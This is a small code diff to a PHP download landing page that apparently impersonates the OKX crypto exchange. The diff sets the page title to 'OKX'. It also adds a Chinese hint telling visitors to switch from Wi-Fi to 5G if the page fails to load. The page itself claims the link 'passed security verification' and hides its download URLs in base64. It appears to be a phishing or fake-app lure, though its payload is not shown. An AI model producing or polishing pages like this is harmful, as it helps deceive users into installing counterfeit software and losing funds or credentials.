@@ -14,7 +14,7 @@ $encryptedBackup2 = base64_encode($backupUrl2);
   <meta charset="UTF-8">
   <meta name="robots" content="noindex, nofollow">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title><?= htmlspecialchars($lang_data['safelink0']) ?></title>
+  <title>OKX</title>
   <style>
     :root {
       --primary: #13bd2c;
@@ -158,7 +158,7 @@ $encryptedBackup2 = base64_encode($backupUrl2);
     
     <h1>链接已通过安全验证</h1>
     <p>系统已自动为您选择最优下载通道</p>
-    
+      <h3 style="color: green;" >若Wifi打不开，请切换至5G手机网络试试</h3>
     <div class="btn-group">
       <button class="btn btn-primary" onclick="startDownload(event, 'primary')">
        主要下载通道
